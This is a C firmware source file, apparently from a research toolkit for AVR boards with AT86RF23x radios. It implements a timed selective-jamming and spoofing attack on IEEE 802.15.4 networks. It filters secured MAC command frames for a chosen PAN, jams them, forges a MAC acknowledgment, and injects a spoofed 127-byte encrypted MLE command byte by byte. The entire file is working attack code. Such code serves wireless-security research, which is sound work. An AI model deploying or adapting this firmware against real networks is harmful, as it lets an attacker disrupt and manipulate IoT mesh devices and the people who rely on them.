/*
 * fw/attacks/attack_16.c - Attack function with ID 16
 *
 * Written 2022 by Dimitrios-Georgios Akestoridis
 * Copyright 2022 Dimitrios-Georgios Akestoridis
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 */

#include <stdbool.h>
#include <stdint.h>

#include <avr/io.h>
#include <avr/interrupt.h>

#define F_CPU 8000000UL
#include <util/delay.h>

#include "at86rf230.h"
#include "spi.h"
#include "board.h"
#include "attack.h"
#include "attack_16.h"


static bool timer_started = 0;
static bool idle_period = 1;
static bool wait_period = 0;
static uint8_t ticks_per_8ms = 0;
static uint32_t elapsed_seconds = 0;
static uint32_t last_activity = 0;


void start_timer(void)
{
	/* Reset the number of 8-millisecond ticks */
	ticks_per_8ms = 0;

	/* Reset the elapsed seconds counter */
	elapsed_seconds = 0;

	/*
	 * Reset the Counter Register of timer 0
	 * and its Output Compare Register A
	 */
	TCNT0 = 0;
	OCR0A = 250;

	/*
	 * Configure timer 0 to operate in CTC mode
	 * with a prescale factor of 256
	 */
	TCCR0A = 1 << WGM01;
	TCCR0B = 1 << CS02;

	/* Enable the Output Compare Match A interrupt */
	TIMSK0 = 1 << OCIE0A;
}


/*
 * Jam only certain 22-byte MAC commands of a specified network
 * that request a MAC acknowledgment
 * and then spoof a MAC acknowledgment
 * followed by a 127-byte MLE command,
 * according to specified active and idle time intervals,
 * with the active period restarting whenever
 * a period of inactivity is observed
 */
bool attack(void)
{
	uint8_t rx_byte = 0;
	uint8_t mac_seq_num = 0;

	/* Read the received packet as soon as possible */
	spi_begin();
	spi_io(AT86RF230_BUF_READ);

	/* Make sure that the timer has started */
	if (!timer_started) {
		/* Start the timer and ignore the received packet */
		timer_started = 1;
		start_timer();
		spi_end();
		return 1;
	}

	/* Check the length of the received packet */
	if (spi_recv() != 22) {
		/*
		 * Ignore packets whose length does not match
		 * the typical length of Data Requests
		 */
		spi_end();
		return 1;
	}

	/* Check the 8 least-significant bits of the MAC Frame Control */
	_delay_us(32);
	rx_byte = spi_recv();
	if ((rx_byte & 0x07) != 0x03) {
		/* Ignore packets that are not MAC Command packets */
		spi_end();
		return 1;
	} else if (!(rx_byte & 0x08)) {
		/* Ignore packets with MAC Security disabled */
		spi_end();
		return 1;
	} else if (!(rx_byte & 0x20)) {
		/* Ignore packets that do not request a MAC acknowledgment */
		spi_end();
		return 1;
	} else if (!(rx_byte & 0x40)) {
		/* Ignore packets that do not compress the PAN ID */
		spi_end();
		return 1;
	}

	/* Check the 8 most-significant bits of the MAC Frame Control */
	_delay_us(32);
	rx_byte = spi_recv();
	if ((rx_byte & 0x30) != 0x10) {
		/*
		 * Ignore packets that do not use the
		 * IEEE 802.15.4-2006 frame version
		 */
		spi_end();
		return 1;
	} else if ((rx_byte & 0x0c) != 0x08) {
		/*
		 * Ignore packets that do not use a short address
		 * for the destination node on the MAC layer
		 */
		spi_end();
		return 1;
	} else if ((rx_byte & 0xc0) != 0x80) {
		/*
		 * Ignore packets that do not use a short address
		 * for the source node on the MAC layer
		 */
		spi_end();
		return 1;
	}

	/* Store the MAC sequence number */
	_delay_us(32);
	mac_seq_num = spi_recv();

	/* Check the destination PAN ID */
	_delay_us(32);
	if (spi_recv() != (PANID & 0xff)) {
		/*
		 * Ignore packets that are
		 * destined for a different network
		 */
		spi_end();
		return 1;
	}
	_delay_us(32);
	if (spi_recv() != ((PANID >> 8) & 0xff)) {
		/*
		 * Ignore packets that are
		 * destined for a different network
		 */
		spi_end();
		return 1;
	}

	/* Determine whether to proceed or not */
	if (idle_period) {
		/* Do not proceed during an idle period */
		spi_end();
		return 1;
	} else if (wait_period) {
		/* Reset the number of 8-millisecond ticks */
		ticks_per_8ms = 0;

		/* Reset the elapsed seconds counter */
		elapsed_seconds = 0;

		/* Reset the relative time of the last activity */
		last_activity = 0;

		/* Check the duration of the active period */
		if (ACTIVESEC > 0) {
			/* Indicate that the active period began */
			wait_period = 0;
		} else {
			/* Do not proceed if there is no active period */
			spi_end();
			return 1;
		}
	}

	/* Check whether a period of inactivity passed or not */
	if (elapsed_seconds - last_activity > IDLESEC) {
		/* Restart the active period */
		ticks_per_8ms = 0;
		elapsed_seconds = 0;
		last_activity = 0;
	} else {
		/* Update the relative time of the last activity */
		last_activity = elapsed_seconds;
	}

	/* Stop receiving and transition into the PLL_ON state */
	spi_end();
#if defined(AT86RF231) || defined(AT86RF212)
	reg_write(REG_TRX_STATE, TRX_CMD_FORCE_PLL_ON);
#elif defined(AT86RF230)
	reg_write(REG_TRX_STATE, TRX_CMD_PLL_ON);
#else
#error "Unknown transceiver"
#endif

	/* Jam the received packet */
	spi_begin();
	spi_send(AT86RF230_BUF_WRITE);
	spi_send(1);
	spi_end();

	/* Transition into the BUSY_TX state */
	slp_tr();

	/* Wait for the transmission of the spoofed MAC acknowledgment */
	_delay_us(752);

	/* Spoof a MAC acknowledgment */
	spi_begin();
	spi_send(AT86RF230_BUF_WRITE);
	spi_send(5);
	spi_send(0x12);
	spi_send(0x00);
	spi_send(mac_seq_num);
	spi_end();

	/* Transition into the BUSY_TX state */
	slp_tr();

	/* Wait for the transmission of the spoofed MLE command */
	_delay_us(560);

	/* Spoof an MLE command */
	spi_begin();
	spi_send(AT86RF230_BUF_WRITE);
	spi_send(127);  /* MPDU Length */
	spi_send(0x71);  /* Frame Control */
	spi_send(0xdc);
	spi_send(0xff);  /* MAC Sequence Number */
	spi_send(PANID & 0xff);  /* Destination PAN ID */
	spi_send((PANID >> 8) & 0xff);
	spi_send(EXTENDEDDSTADDR & 0xff);  /* MAC Destination Address */
	spi_send((EXTENDEDDSTADDR >> 8) & 0xff);
	spi_send((EXTENDEDDSTADDR >> 16) & 0xff);
	spi_send((EXTENDEDDSTADDR >> 24) & 0xff);
	spi_send((EXTENDEDDSTADDR >> 32) & 0xff);
	spi_send((EXTENDEDDSTADDR >> 40) & 0xff);
	spi_send((EXTENDEDDSTADDR >> 48) & 0xff);
	spi_send((EXTENDEDDSTADDR >> 56) & 0xff);
	spi_send(EXTENDEDSRCADDR & 0xff);  /* MAC Source Address */
	spi_send((EXTENDEDSRCADDR >> 8) & 0xff);
	spi_send((EXTENDEDSRCADDR >> 16) & 0xff);
	spi_send((EXTENDEDSRCADDR >> 24) & 0xff);
	spi_send((EXTENDEDSRCADDR >> 32) & 0xff);
	spi_send((EXTENDEDSRCADDR >> 40) & 0xff);
	spi_send((EXTENDEDSRCADDR >> 48) & 0xff);
	spi_send((EXTENDEDSRCADDR >> 56) & 0xff);
	spi_send(0x7f);  /* IPHC Header */
	spi_send(0x33);
	spi_send(0xf0);  /* NHC UDP Header */
	spi_send(0x4d);  /* Source Port */
	spi_send(0x4c);
	spi_send(0x4d);  /* Destination Port */
	spi_send(0x4c);
	spi_send((UDPCHECKSUM >> 8) & 0xff);  /* UDP Checksum */
	spi_send(UDPCHECKSUM & 0xff);
	spi_send(0x00);  /* MLE Security Suite */
	spi_send(0x15);  /* MLE Security Control */
	spi_send(FRAMECOUNTER & 0xff);  /* MLE Frame Counter */
	spi_send((FRAMECOUNTER >> 8) & 0xff);
	spi_send((FRAMECOUNTER >> 16) & 0xff);
	spi_send((FRAMECOUNTER >> 24) & 0xff);
	spi_send(KEYSOURCE & 0xff);  /* MLE Key Source */
	spi_send((KEYSOURCE >> 8) & 0xff);
	spi_send((KEYSOURCE >> 16) & 0xff);
	spi_send((KEYSOURCE >> 24) & 0xff);
	spi_send(KEYINDEX & 0xff);  /* MLE Key Index */
	spi_send(0x36);  /* Encrypted Payload */
	spi_send(0x9e);
	spi_send(0xca);
	spi_send(0x0a);
	spi_send(0x5d);
	spi_send(0xca);
	spi_send(0xb2);
	spi_send(0x77);
	spi_send(0xcb);
	spi_send(0xfd);
	spi_send(0x06);
	spi_send(0x3a);
	spi_send(0xa6);
	spi_send(0xec);
	spi_send(0xe7);
	spi_send(0xfa);
	spi_send(0xf2);
	spi_send(0x04);
	spi_send(0x52);
	spi_send(0x1c);
	spi_send(0xce);
	spi_send(0x65);
	spi_send(0xca);
	spi_send(0xd3);
	spi_send(0xa0);
	spi_send(0x44);
	spi_send(0x6c);
	spi_send(0xf8);
	spi_send(0x77);
	spi_send(0xc5);
	spi_send(0xc7);
	spi_send(0x93);
	spi_send(0x4b);
	spi_send(0x1b);
	spi_send(0x83);
	spi_send(0xa3);
	spi_send(0xfa);
	spi_send(0x4c);
	spi_send(0x09);
	spi_send(0x0d);
	spi_send(0x36);
	spi_send(0xe0);
	spi_send(0x58);
	spi_send(0x09);
	spi_send(0x3d);
	spi_send(0xa9);
	spi_send(0x7e);
	spi_send(0xa3);
	spi_send(0xb4);
	spi_send(0x22);
	spi_send(0x69);
	spi_send(0xf9);
	spi_send(0x53);
	spi_send(0xa0);
	spi_send(0xf8);
	spi_send(0x5a);
	spi_send(0xec);
	spi_send(0x68);
	spi_send(0x2a);
	spi_send(0x17);
	spi_send(0x85);
	spi_send(0xa3);
	spi_send(0x77);
	spi_send(0x79);
	spi_send(0x01);
	spi_send(0xd5);
	spi_send(0x5f);
	spi_send(0xf2);
	spi_send(0x11);
	spi_send(0x70);
	spi_send(0x89);
	spi_send(0x52);
	spi_send(0xc4);
	spi_send(0x29);
	spi_send(0x3d);
	spi_send(0x42);
	spi_send(0x51);
	spi_send(0xc8);
	spi_send(0x93);
	spi_send(0x1e);
	spi_send(0x5d);  /* Message Integrity Code */
	spi_send(0x04);
	spi_send(0x33);
	spi_send(0x25);
	spi_end();

	/* Transition into the BUSY_TX state */
	slp_tr();

	/* Transition into the RX_ON state */
	change_state(TRX_CMD_RX_ON);

	return 1;
}


ISR(TIMER0_COMPA_vect)
{
	/* Update the number of 8-millisecond ticks */
	ticks_per_8ms++;

	/* Check whether a second has passed */
	if (ticks_per_8ms == 125) {
		/* Reset the number of 8-millisecond ticks */
		ticks_per_8ms = 0;

		/* Update the elapsed seconds counter */
		elapsed_seconds++;

		/* Check for potential period transitions */
		if (idle_period) {
			/* Determine whether the idle period ended or not */
			if (elapsed_seconds >= IDLESEC) {
				/* Reset the elapsed seconds counter */
				elapsed_seconds = 0;

				/* Indicate that the wait period began */
				idle_period = 0;
				wait_period = 1;
			}
		} else if (!wait_period) {
			/* Determine whether the active period ended or not */
			if (elapsed_seconds - last_activity > IDLESEC) {
				/* Reset the elapsed seconds counter */
				elapsed_seconds = 0;

				/* Restart the wait period */
				wait_period = 1;
			} else if (elapsed_seconds >= ACTIVESEC) {
				/* Reset the elapsed seconds counter */
				elapsed_seconds = 0;

				/* Check the duration of the idle period */
				if (IDLESEC > 0) {
					/* Indicate that the idle period began */
					idle_period = 1;
					wait_period = 0;
				}
			}
		}
	}
}
